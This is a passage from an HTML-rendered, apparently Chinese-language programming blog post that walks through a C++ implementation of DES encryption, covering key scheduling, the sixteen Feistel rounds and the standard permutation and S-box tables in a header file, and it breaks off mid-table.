bitset&lt;56&gt; realkeys;<span class="comment">//该序列是去掉奇偶标志位而且已经置换过了</span></span><br><span class="line">    bitset&lt;28&gt; leftkey,rightkey;</span><br><span class="line">    <span class="function">bitset&lt;64&gt; <span class="title">key</span><span class="params">(keys)</span></span>;</span><br><span class="line">    bitset&lt;48&gt; compresskeys;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;64bitkeys:&quot;</span>&lt;&lt;key&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//根据密钥置换表，按照里面的置换规则可以去掉奇偶标志位 64-&gt;56</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">56</span>;i++)</span><br><span class="line">        realkeys[<span class="number">55</span>-i]=key[<span class="number">64</span>-PC_1[i]];<span class="comment">//置换是从右往左开始</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;56bitreky:&quot;</span>&lt;&lt;realkeys&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//先移位再置换 56-&gt;48 并且存于subkey里面</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> time=<span class="number">0</span>;time&lt;<span class="number">16</span>;time++)&#123;</span><br><span class="line">        <span class="comment">//先拿后每28位 然后分别进行左移  </span></span><br><span class="line">        <span class="comment">//再合成赋值给原来的realkeys  </span></span><br><span class="line">        <span class="comment">//原来的realkey(56)置换成最后的compresskey(48)存入数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)&#123;</span><br><span class="line">            rightkey[i]=realkeys[i];</span><br><span class="line">            leftkey[i]=realkeys[i+<span class="number">28</span>];</span><br><span class="line">        &#125;      </span><br><span class="line">        rightkey=<span class="built_in">leftshifts</span>(rightkey,shiftBits[time]);</span><br><span class="line">        leftkey=<span class="built_in">leftshifts</span>(leftkey,shiftBits[time]);</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;第&quot;</span>&lt;&lt;time+<span class="number">1</span>&lt;&lt;<span class="string">&quot;次:&quot;</span>&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;lfky:&quot;</span>&lt;&lt;leftkey&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;rgky:&quot;</span>&lt;&lt;rightkey&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//左移之后两个key赋值回原来的realkey</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">56</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">28</span>)&#123;</span><br><span class="line">                realkeys[i]=rightkey[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                realkeys[i]=leftkey[i<span class="number">-28</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//从56-&gt;48存在暂存</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">48</span>;i++)&#123;</span><br><span class="line">            compresskeys[<span class="number">47</span>-i]=realkeys[<span class="number">56</span>-PC_2[i]];<span class="comment">//置换是从右往左边开始的</span></span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;48bitreky:&quot;</span>&lt;&lt;realkeys&lt;&lt;endl;</span><br><span class="line">        subKey[time]=compresskeys;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;--------------------------&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//-------------密钥处理 输入的64位密钥转存在16轮子密钥中-----------------------</span></span><br><span class="line">    <span class="comment">//-----------------加密过程-----------------</span></span><br><span class="line">    string mingwen=<span class="string">&quot;000100100011010001010110011110001001101010111100110111101111&quot;</span>;</span><br><span class="line">    <span class="function">bitset&lt;64&gt; <span class="title">plain</span><span class="params">(mingwen)</span></span>;<span class="comment">//bitset的偏移是从右往左进行偏移</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;明文:&quot;</span>&lt;&lt;plain&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//置换后的原文</span></span><br><span class="line">    bitset&lt;64&gt; currentBits;</span><br><span class="line">    <span class="comment">//左右各32位 </span></span><br><span class="line">    bitset&lt;32&gt; leftBits,rightBits;</span><br><span class="line">    bitset&lt;32&gt; newLeft;</span><br><span class="line">    <span class="comment">//加密后的密文</span></span><br><span class="line">    bitset&lt;64&gt; cipher;</span><br><span class="line">    <span class="comment">//首先对密文进行初始置换</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">currentBits[<span class="number">63</span>-i] = plain[<span class="number">64</span>-IP[i]];</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;初始置换:&quot;</span>&lt;&lt;currentBits&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        rightBits[i]=currentBits[i];</span><br><span class="line">        leftBits[i]=currentBits[i+<span class="number">32</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;L0  &quot;</span>&lt;&lt;leftBits&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;R0  &quot;</span>&lt;&lt;rightBits&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//十六轮迭代</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;第&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;轮&quot;</span>&lt;&lt;endl;</span><br><span class="line">        newLeft=rightBits;</span><br><span class="line">        rightBits=leftBits^<span class="built_in">f</span>(rightBits,subKey[i]);</span><br><span class="line">        leftBits=newLeft;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;L&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;leftBits&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;R&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;rightBits&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;L16&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;leftBits&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;R16&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;rightBits&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//最后合并密文 左右互换</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;<span class="number">32</span>)&#123;</span><br><span class="line">            cipher[i]=leftBits[i];</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cipher[i]=rightBits[i<span class="number">-32</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后逆初始置换</span></span><br><span class="line">    currentBits=cipher;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">        cipher[<span class="number">63</span>-i]=currentBits[<span class="number">64</span>-IP_1[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;密文:&quot;</span>&lt;&lt;cipher&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>temp.h</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 初始置换表</span></span><br><span class="line"><span class="keyword">int</span> IP[] = &#123;<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line"><span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line"><span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line"><span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结尾置换表</span></span><br><span class="line"><span class="keyword">int</span> IP_1[] = &#123;<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">  <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">  <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">  <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">  <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">  <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*------------------下面是生成密钥所用表-----------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥置换表，将64位密钥变成56位</span></span><br><span class="line"><span class="keyword">int</span> PC_1[] = &#123;<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">   <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">  <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">  <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">   <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">  <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩置换，将56位密钥压缩成48位子密钥</span></span><br><span class="line"><span class="keyword">int</span> PC_2[] = &#123;<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,</span><br><span class="line">   <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">  <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">26</span>,  <span class="number">8</span>,</span><br><span class="line">  <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line">  <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">  <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">  <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">  <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每轮左移的位数</span></span><br><span class="line"><span class="keyword">int</span> shiftBits[] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*------------------下面是密码函数 f 所用表-----------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展置换表，将 32位 扩展至 48位</span></span><br><span class="line"><span class="keyword">int</span> E[] = &#123;<span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">    <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">   <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">   <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">   <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">   <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">   <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// S盒，每个S盒是4x16的置换表，6位 -&gt; 4位</span></span><br><span class="line"><span class="keyword">int</span> S_BOX[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">&#123;  </span><br><span class="line">&#123;<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>&#125;,  </span><br><span class="line">&#123;<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,  </span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>&#125;, </span><br><span class="line">&#123;<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>&#125; </span><br><span class="line">&#125;,</span><br><span class="line">&#123;  </span><br><span class="line">&#123;<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>&#125;,  </span><br><span class="line">&#123;<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>&#125;, </span><br><span class="line">&#123;<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>&#125;,  </span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>&#125;  </span><br><span class="line">&#125;, </span><br><span class="line">&#123;  </span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>&#125;,  </span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>&#125;,  </span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>&#125;,  </span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>&#125;  </span><br><span class="line">&#125;, </span><br><span class="line">&#123;  </span><br><span class="line">&#123;<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>&#125;,  </span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,  </span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>&#125;,  </span><br><span class="line">&#123;<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>&#125;  </span><br><span class="line">&#125;,</span><br><span class="line">&#123;  </span><br><span class="line">&#123;<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,  </span><br><span class="line">&#123;<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,  </span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>&#125;,  </span><br><span class="line">&#123;<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>&#125;  </span><br><span class="line">&#125;,</span><br><span class="line">&#123;  </span><br><span class="line">&#123;<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>&#125;,  </span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,  </span><br><span class="line">&#123;<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>&#125;,  </span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>&#125;  </span><br><span class="line">&#125;, </span><br><span class="line">&#123;  </span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>&#125;,  </span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span 